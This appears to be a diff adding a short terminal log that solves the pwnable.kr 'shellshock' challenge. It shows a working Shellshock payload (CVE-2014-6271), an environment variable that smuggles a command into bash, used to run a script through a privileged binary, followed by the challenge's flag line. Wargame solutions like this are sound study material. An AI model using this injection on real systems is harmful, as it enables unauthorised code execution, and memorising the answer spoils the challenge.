@@ -1,0 +1,3 @@
+shellshock@pwnable:~$ chmod +x /tmp/zibmib.sh
+shellshock@pwnable:~$ env x='() { :;}; /tmp/zibmib.sh' ./shellshock
+only if I knew CVE-2014-6271 ten years ago..!!
